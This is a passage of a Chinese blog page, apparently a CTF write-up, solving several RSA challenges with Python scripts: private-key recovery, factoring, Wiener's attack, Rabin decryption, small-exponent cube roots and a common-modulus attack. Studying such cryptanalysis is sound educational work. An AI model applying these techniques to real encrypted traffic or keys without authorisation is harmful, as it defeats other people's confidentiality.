id="利用-e-N-d-算-private-key-pem"><a href="#利用-e-N-d-算-private-key-pem" class="headerlink" title="利用 e N d 算 private_key.pem"></a>利用 e N d 算 private_key.pem</h2><p>利用 rsatool.py<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -e 65537 -n 74207624142945242263057035287110983967646020057307828709587969646701361764263 -d 23071769375111040425287244625328797615295772814180109366784249976498215494337 -o private_key.pem -f PEM</span><br></pre></td></tr></table></figure></p><p>得到私钥 private_key.pem</p><p><img src="rsatool1.png" alt></p><h2 id="利用私钥解密"><a href="#利用私钥解密" class="headerlink" title="利用私钥解密"></a>利用私钥解密</h2><p>把 flag.enc 和 private_key.pem 放在同一个目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> flag.enc -inkey private_key.pem -out flag.dec</span><br></pre></td></tr></table></figure><p>得到明文</p><p><img src="flagdec.png" alt></p><h1 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h1><p>已知 p q 和密文 c ，算出明文 m </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">e = 65537</span><br><span class="line">c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034</span><br></pre></td></tr></table></figure><p>python 代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p =  9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483</span><br><span class="line">q =  11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407</span><br><span class="line">n =  p*q</span><br><span class="line">d =  56632047571190660567520341028861194862411428416862507034762587229995138605649836960220619903456392752115943299335385163216233744624623848874235303309636393446736347238627793022725260986466957974753004129210680401432377444984195145009801967391196615524488853620232925992387563270746297909112117451398527453977</span><br><span class="line">c =  0x767e17d22b50bcca982d1b09432365d6db9e417a03eef72899e6a05cb7a8bb4cc0b158fbdc463adba96d9b4acfd43cd75c80da6e87749a8482a65b5dffcec573c63924c62903ad802fe6e60905ae3c02cb9e916c01e651de914663f76267ed23895add9915ec171966841ad7b6d9d943a2bd023c3af9f96893705e98613f739a</span><br><span class="line"><span class="built_in">print</span> int((<span class="string">'%x'</span> % pow(c,d,n)),16)</span><br></pre></td></tr></table></figure><p>求出m的十进制</p><p><img src="flag2.png" alt></p><h1 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h1><p>已知 N e 和数组 c</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#123;920139713,19&#125;</span><br><span class="line"> </span><br><span class="line">704796792</span><br><span class="line">752211152</span><br><span class="line">274704164</span><br><span class="line">18414022</span><br><span class="line">368270835</span><br><span class="line">483295235</span><br><span class="line">263072905</span><br><span class="line">459788476</span><br><span class="line">483295235</span><br><span class="line">459788476</span><br><span class="line">663551792</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">428313374</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">425392137</span><br><span class="line">704796792</span><br><span class="line">458265677</span><br><span class="line">341524652</span><br><span class="line">483295235</span><br><span class="line">534149509</span><br><span class="line">425392137</span><br><span class="line">428313374</span><br><span class="line">425392137</span><br><span class="line">341524652</span><br><span class="line">458265677</span><br><span class="line">263072905</span><br><span class="line">483295235</span><br><span class="line">828509797</span><br><span class="line">341524652</span><br><span class="line">425392137</span><br><span class="line">475206804</span><br><span class="line">428313374</span><br><span class="line">483295235</span><br><span class="line">475206804</span><br><span class="line">459788476</span><br><span class="line">306220148</span><br></pre></td></tr></table></figure><p>利用 yafu 求出 p q </p><p>再利用 p q e 算 d </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p=18443 </span><br><span class="line">q=49891</span><br><span class="line">e=19</span><br><span class="line">d=gmpy2.invert(e, (p-1)*(q-1))</span><br><span class="line"><span class="built_in">print</span> d</span><br></pre></td></tr></table></figure><p>python 代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="comment">#快速幂取模</span></span><br><span class="line">def expMod2 (x, y, k ):  </span><br><span class="line">    MASK = 0xffffffff  </span><br><span class="line">    tx = x  </span><br><span class="line">    modRes = 1  </span><br><span class="line">    tx %= k  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">while</span> (y&amp;MASK):  </span><br><span class="line">        <span class="keyword">if</span> (y&amp;1):  </span><br><span class="line">            modRes = modRes * tx % k;</span><br><span class="line">              </span><br><span class="line">        y = (y&gt;&gt;1);  </span><br><span class="line">        tx = tx * tx % k;  </span><br><span class="line">    <span class="built_in">return</span> modRes  </span><br><span class="line"></span><br><span class="line">def toStr(i):</span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> i!=0:</span><br><span class="line">        result = chr(i % 256) + result</span><br><span class="line">        i = i/256</span><br><span class="line">    <span class="built_in">return</span> result</span><br><span class="line"></span><br><span class="line">B = [</span><br><span class="line">704796792,</span><br><span class="line">752211152,</span><br><span class="line">274704164,</span><br><span class="line">18414022,</span><br><span class="line">368270835,</span><br><span class="line">483295235,</span><br><span class="line">263072905,</span><br><span class="line">459788476,</span><br><span class="line">483295235,</span><br><span class="line">459788476,</span><br><span class="line">663551792,</span><br><span class="line">475206804,</span><br><span class="line">459788476,</span><br><span class="line">428313374,</span><br><span class="line">475206804,</span><br><span class="line">459788476,</span><br><span class="line">425392137,</span><br><span class="line">704796792,</span><br><span class="line">458265677,</span><br><span class="line">341524652,</span><br><span class="line">483295235,</span><br><span class="line">534149509,</span><br><span class="line">425392137,</span><br><span class="line">428313374,</span><br><span class="line">425392137,</span><br><span class="line">341524652,</span><br><span class="line">458265677,</span><br><span class="line">263072905,</span><br><span class="line">483295235,</span><br><span class="line">828509797,</span><br><span class="line">341524652,</span><br><span class="line">425392137,</span><br><span class="line">475206804,</span><br><span class="line">428313374,</span><br><span class="line">483295235,</span><br><span class="line">475206804,</span><br><span class="line">459788476,</span><br><span class="line">306220148, </span><br><span class="line">     ]</span><br><span class="line"></span><br><span class="line">n = 920139713</span><br><span class="line">d = 96849619</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> B:</span><br><span class="line">    a = expMod2(b, d, n)</span><br><span class="line">    result += toStr(a)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span> result</span><br></pre></td></tr></table></figure><p><img src="flag3.png" alt></p><h1 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h1><p>N 很大的无法分解的情况</p><p>已知 <a href="warmup.zip">PUBLIC KEY</a> 和 <a href="c.txt">c</a></p><h2 id="求出-n-e"><a href="#求出-n-e" class="headerlink" title="求出 n e"></a>求出 n e</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA </span><br><span class="line">pub = RSA.importKey(open(<span class="string">'warmup.pub'</span>).<span class="built_in">read</span>())</span><br><span class="line">n = long(pub.n)</span><br><span class="line">e = long(pub.e)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'n:%d'</span>%n</span><br><span class="line"><span class="built_in">print</span> <span class="string">'e:%d'</span>%e</span><br><span class="line"></span><br><span class="line">n:109966163992903243770643456296093759130737510333736483352345488643432614201030629970207047930115652268531222079508230987041869779760776072105738457123387124961036111210544028669181361694095594938869077306417325203381820822917059651429857093388618818437282624857927551285811542685269229705594166370426152128895901914709902037365652575730201897361139518816164746228733410283595236405985958414491372301878718635708605256444921222945267625853091126691358833453283744166617463257821375566155675868452032401961727814314481343467702299949407935602389342183536222842556906657001984320973035314726867840698884052182976760066141</span><br><span class="line">e:30749686305802061816334591167284030734478031427751495527922388099381921172620569310945418007467306454160014597828390709770861577479329793948103408489494025272834473555854835044153374978554414416305012267643957838998648651100705446875979573675767605387333733876537528353237076626094553367977134079292593746416875606876735717905892280664538346000950343671655257046364067221469807138232820446015769882472160551840052921930357988334306659120253114790638496480092361951536576427295789429197483597859657977832368912534761100269065509351345050758943674651053419982561094432258103614830448382949765459939698951824447818497599</span><br></pre></td></tr></table></figure><h2 id="尝试用-n-算出-p-q-factor-十进制"><a href="#尝试用-n-算出-p-q-factor-十进制" class="headerlink" title="尝试用 n 算出 p q  factor(十进制..)"></a>尝试用 n 算出 p q  factor(十进制..)</h2><p>yafu-x64.exe factor(109966163992…)  N太大算不出来。。</p><h2 id="使用RSAwienerHacker-py-直接算出-d"><a href="#使用RSAwienerHacker-py-直接算出-d" class="headerlink" title="使用RSAwienerHacker.py 直接算出 d"></a>使用RSAwienerHacker.py 直接算出 d</h2><p><a href="rsa-wiener-attack-master.rar">RSAwienerHacker.py下载</a></p><p><img src="rsa-winner.png" alt></p><h2 id="利用-c-d-n-求-m"><a href="#利用-c-d-n-求-m" class="headerlink" title="利用 c d n 求 m"></a>利用 c d n 求 m</h2><p>方法一：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=0x1e04304936215de8e21965cfca9c245b1a8f38339875d36779c0f123c475bc24d5eef50e7d9ff5830e80c62e8083ec55f27456c80b0ab26546b9aeb8af30e82b650690a2ed7ea407dcd094ab9c9d3d25a93b2140dcebae1814610302896e67f3ae37d108cd029fae6362ea7ac1168974c1a747ec9173799e1107e7a56d783660418ebdf6898d7037cea25867093216c2c702ef3eef71f694a6063f5f0f1179c8a2afe9898ae8dec5bb393cdffa3a52a297cd96d1ea602309ecf47cd009829b44ed3100cf6194510c53c25ca7435f60ce5f4f614cdd2c63756093b848a70aade002d6bc8f316c9e5503f32d39a56193d1d92b697b48f5aa43417631846824b5e86</span><br><span class="line">d=4221909016509078129201801236879446760697885220928506696150646938237440992746683409881141451831939190609743447676525325543963362353923989076199470515758399L</span><br><span class="line">n=109966163992903243770643456296093759130737510333736483352345488643432614201030629970207047930115652268531222079508230987041869779760776072105738457123387124961036111210544028669181361694095594938869077306417325203381820822917059651429857093388618818437282624857927551285811542685269229705594166370426152128895901914709902037365652575730201897361139518816164746228733410283595236405985958414491372301878718635708605256444921222945267625853091126691358833453283744166617463257821375566155675868452032401961727814314481343467702299949407935602389342183536222842556906657001984320973035314726867840698884052182976760066141</span><br><span class="line"><span class="built_in">print</span> (<span class="string">'%x'</span> % pow(c,d,n)).decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure></p><p>方法二：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from libnum import n2s</span><br><span class="line">n=0x1564aade6f1b9f169dcc94c9787411984cd3878bcd6236c5ce00b4aad6ca7cb0ca8a0334d9fe0726f8b057c4412cfbff75967a91a370a1c1bd185212d46b581676cf750c05bbd349d3586e78b33477a9254f6155576573911d2356931b98fe4fec387da3e9680053e95a4709934289dc0bc5cdc2aa97ce62a6ca6ba25fca6ae38c0b9b55c16be0982b596ef929b7c71da3783c1f20557e4803de7d2a91b5a6e85df64249f48b4cf32aec01c12d3e88e014579982ecd046042af370045f09678c9029f8fc38ebaea564c29115e19c7030f245ebb2130cbf9dc1c340e2cf17a625376ca52ad8163cfb2e33b6ecaf55353bc1ff19f8f4dc7551dc5ba36235af9758b</span><br><span class="line">d=0x12314d6d6327261ee18a7c6ce8562c304c05069bc8c8e0b34e0023a3b48cf5849278d3493aa86004b02fa6336b098a3330180b9b9655cdf927896b22402a18fae186828efac14368e0a5af2c4d992cb956d52e7c9899d9b16a0a07318aa28c8202ebf74c50ccf49a6733327dde111393611f915f1e1b82933a2ba164aff93ef4ab2ab64aacc2b0447d437032858f089bcc0ddeebc45c45f8dc357209a423cd49055752bfae278c93134777d6e181be22d4619ef226abb6bfcc4adec696cac131f5bd10c574fa3f543dd7f78aee1d0665992f28cdbcf55a48b32beb7a1c0fa8a9fc38f0c5c271e21b83031653d96d25348f8237b28642ceb69f0b0374413308481</span><br><span class="line">c=0x126c24e146ae36d203bef21fcd88fdeefff50375434f64052c5473ed2d5d2e7ac376707d76601840c6aa9af27df6845733b9e53982a8f8119c455c9c3d5df1488721194a8392b8a97ce6e783e4ca3b715918041465bb2132a1d22f5ae29dd2526093aa505fcb689d8df5780fa1748ea4d632caed82ca923758eb60c3947d2261c17f3a19d276c2054b6bf87dcd0c46acf79bff2947e1294a6131a7d8c786bed4a1c0b92a4dd457e54df577fb625ee394ea92b992a2c22e3603bf4568b53cceb451e5daca52c4e7bea7f20dd9075ccfd0af97f931c0703ba8d1a7e00bb010437bb4397ae802750875ae19297a7d8e1a0a367a2d6d9dd03a47d404b36d7defe8469</span><br><span class="line"><span class="built_in">print</span> n2s(pow(c,d,n))</span><br></pre></td></tr></table></figure><h1 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h1><p>e=2 的情况</p><p><img src="rabin.png" alt></p><p>已知 <a href="pubkey1.zip">PUBLIC KEY</a> 和 <a href="flag1.enc">flag.enc</a>  </p><h2 id="求出-n-e-1"><a href="#求出-n-e-1" class="headerlink" title="求出 n e"></a>求出 n e</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA </span><br><span class="line">pub = RSA.importKey(open(<span class="string">'pubkey.pem'</span>).<span class="built_in">read</span>())</span><br><span class="line">n = long(pub.n)</span><br><span class="line">e = long(pub.e)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'n:%d'</span>%n</span><br><span class="line"><span class="built_in">print</span> <span class="string">'e:%d'</span>%e</span><br></pre></td></tr></table></figure><h2 id="利用-n-算出-p-q-factor-十进制"><a href="#利用-n-算出-p-q-factor-十进制" class="headerlink" title="利用 n 算出 p q  factor(十进制..)"></a>利用 n 算出 p q  factor(十进制..)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yafu-x64.exe factor(87924348264132406875276140514499937145050893665602592992418171647042491658461) </span><br><span class="line"></span><br><span class="line">p = 275127860351348928173285174381581152299</span><br><span class="line">q = 319576316814478949870590164193048041239</span><br></pre></td></tr></table></figure><p>python 代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">代码如下：</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">from libnum import n2s,s2n</span><br><span class="line">import gmpy2</span><br><span class="line">f = open(<span class="string">'flag.enc'</span>,<span class="string">'r'</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">c = s2n(c)</span><br><span class="line">p = 275127860351348928173285174381581152299</span><br><span class="line">q = 319576316814478949870590164193048041239</span><br><span class="line">n = p*q</span><br><span class="line">r = pow(c,(p+1)/4,p)</span><br><span class="line">s = pow(c,(q+1)/4,q)</span><br><span class="line">a = gmpy2.invert(p,q)</span><br><span class="line">b = gmpy2.invert(q,p)</span><br><span class="line">x =(a*p*s+b*q*r)%n</span><br><span class="line">y =(a*p*s-b*q*r)%n</span><br><span class="line"><span class="built_in">print</span> n2s(x%n)</span><br><span class="line"><span class="built_in">print</span> n2s((-x)%n)</span><br><span class="line"><span class="built_in">print</span> n2s(y%n)</span><br><span class="line"><span class="built_in">print</span> n2s((-y)%n)</span><br></pre></td></tr></table></figure></p><p><img src="flag5.png" alt></p><h1 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h1><p>Extremely hard RSA</p><p>已知 <a href="pubkey2.zip">PUBLIC KEY</a> 和 <a href="flag2.enc">flag.enc</a> </p><p>N 非常大，e=3</p><h2 id="求出-n-e-2"><a href="#求出-n-e-2" class="headerlink" title="求出 n e"></a>求出 n e</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.PublicKey import RSA </span><br><span class="line">pub = RSA.importKey(open(<span class="string">'pubkey.pem'</span>).<span class="built_in">read</span>())</span><br><span class="line">n = long(pub.n)</span><br><span class="line">e = long(pub.e)</span><br><span class="line"><span class="built_in">print</span> <span class="string">'n:%d'</span>%n</span><br><span class="line"><span class="built_in">print</span> <span class="string">'e:%d'</span>%e</span><br><span class="line"></span><br><span class="line">nspan><br><span class="line">e:3</span><br></pre></td></tr></table></figure><p>公钥中，e=3，N非常大。所以可以不断地c+N然后开三次方，直接写代码爆破，不过python单线程有点长，跑了将近30分钟。</p><p>python代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">from libnum import s2n,n2s</span><br><span class="line">from gmpy2 import iroot</span><br><span class="line">n = 721059527572145959497866070657244746540818298735241721382435892767279354577831824618770455583435147844630635953460258329387406192598509097375098935299515255208445013180388186216473913754107215551156731413550416051385656895153798495423962750773689964815342291306243827028882267935999927349370340823239030087548468521168519725061290069094595524921012137038227208900579645041589141405674545883465785472925889948455146449614776287566375730215127615312001651111977914327170496695481547965108836595145998046638495232893568434202438172004892803105333017726958632541897741726563336871452837359564555756166187509015523771005760534037559648199915268764998183410394036820824721644946933656264441126738697663216138624571035323231711566263476403936148535644088575960271071967700560360448191493328793704136810376879662623765917690163480410089565377528947433177653458111431603202302962218312038109342064899388130688144810901340648989107010954279327738671710906115976561154622625847780945535284376248111949506936128229494332806622251145622565895781480383025403043645862516504771643210000415216199272423542871886181906457361118669629044165861299560814450960273479900717138570739601887771447529543568822851100841225147694940195217298482866496536787241</span><br><span class="line">e = 3</span><br><span class="line">f = open(<span class="string">'flag.enc'</span>,<span class="string">'rb'</span>)</span><br><span class="line">c= f.read()</span><br><span class="line">c = s2n(c)</span><br><span class="line">f.close()</span><br><span class="line">i = 118719480</span><br><span class="line"><span class="keyword">while</span> 1:</span><br><span class="line">    res = iroot(c+i*n,3)</span><br><span class="line">    <span class="keyword">if</span>(res[1] == True):</span><br><span class="line">        <span class="built_in">print</span> res[0]</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">"i="</span>+str(i)</span><br><span class="line">    i = i+1</span><br><span class="line"><span class="built_in">print</span> n2s(res[0])</span><br><span class="line"></span><br><span class="line"><span class="comment">#i=118719487</span></span><br></pre></td></tr></table></figure></p><h1 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h1><p>共模攻击(hard RSA)</p><p>已知<a href="rsa.txt">rsa.txt</a></p><p>当 n 不变的情况下，知道 n e1 e2 c1 c2 可以在不知道 d1 d2 的情况下，解出 m<br>首先找到两个 e 是互质的,能够找到 s1,s2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e1*s1 + e2*s2 = 1</span><br></pre></td></tr></table></figure><p>根据一系列推算，可以算出明文 m<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m = c1^s1*c2^s2 mod N</span><br></pre></td></tr></table></figure></p><p>判断是否互质<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def gcd(a,b):  </span><br><span class="line">    <span class="keyword">if</span> a%b == 0:  </span><br><span class="line">        <span class="built_in">return</span> b  </span><br><span class="line">    <span class="keyword">else</span> :  </span><br><span class="line">        <span class="built_in">return</span> gcd(b,a%b)  <span class="comment">#判断是否互质</span></span><br></pre></td></tr></table></figure></p><h2 id="找出互质的两个数"><a href="#找出互质的两个数" class="headerlink" title="找出互质的两个数"></a>找出互质的两个数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">data=open(<span class="string">'rsa.txt'</span>,<span class="string">'r'</span>).<span class="built_in">read</span>()</span><br><span class="line">e=re.compile(r<span class="string">'zks(.*?)zks'</span>).findall(data)  <span class="comment">#把文件中的：改成zks</span></span><br><span class="line">def gcd(a,b):  </span><br><span class="line">    <span class="keyword">if</span> a%b == 0:  </span><br><span class="line">        <span class="built_in">return</span> b  </span><br><span class="line">    <span class="keyword">else</span> :  </span><br><span class="line">        <span class="built_in">return</span> gcd(b,a%b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> e:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> e:</span><br><span class="line">        <span class="keyword">if</span> gcd(int(i.replace(<span class="string">'L'</span>,<span class="string">''</span>),16),int(j.replace(<span class="string">'L'</span>,<span class="string">''</span>),16))==1:</span><br><span class="line">            <span class="built_in">print</span> i,j,int(i.replace(<span class="string">'L'</span>,<span class="string">''</span>),16),int(j.replace(<span class="string">'L'</span>,<span class="string">''</span>),16)</span><br></pre></td></tr></table></figure><h2 id="python代码如下："><a href="#python代码如下：" class="headerlink" title="python代码如下："></a>python代码如下：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">代码如下：</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">from gmpy2 import invert</span><br><span class="line">from libnum import n2s</span><br><span class="line"></span><br><span class="line">def egcd(a, b):</span><br><span class="line">    <span class="keyword">if</span> a == 0:</span><br><span class="line">        <span class="built_in">return</span> (b, 0, 1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="built_in">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    n = 116547141139745534253172934123407786743246513874292261984447028928003798881819567221547298751255790928878194794155722543477883428672342894945552668904410126460402501558930911637857436926624838677630868157884406020858164140754510239986466552869866296144106255873879659676368694043769795604582888907403261286211</span><br><span class="line">    c1 = 78552378607874335972488545767374401332953345586323262531477516680347117293352843468592985447836452620945707838830990843415342047337735534418287912723395148814463617627398248738969202758950481027762126608368555442533803610260859075919831387641824493902538796161102236794716963153162784732179636344267189394853</span><br><span class="line">    c2 = 98790462909782651815146615208104450165337326951856608832305081731255876886710141821823912122797166057063387122774480296375186739026132806230834774921466445172852604926204802577270611302881214045975455878277660638731607530487289267225666045742782663867519468766276566912954519691795540730313772338991769270201</span><br><span class="line">    e1 = 1804229351</span><br><span class="line">    e2 = 17249876309</span><br><span class="line">    s = egcd(e1, e2)</span><br><span class="line">    s1 = s[1]</span><br><span class="line">    s2 = s[2]</span><br><span class="line">  <span class="comment"># 求模反元素</span></span><br><span class="line">    <span class="keyword">if</span> s1&lt;0:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2&lt;0:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">    m = pow(c1,s1,n)*pow(c2,s2,n) % n</span><br><span class="line">    <span class="comment">#m=hex(m).replace('0x','')</span></span><br><span class="line">    <span class="comment">#print m.decode('hex')</span></span><br><span class="line">    <span class="built_in">print</span> n2s(m)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="第八题"><a href="#第八题" class="headerlink" 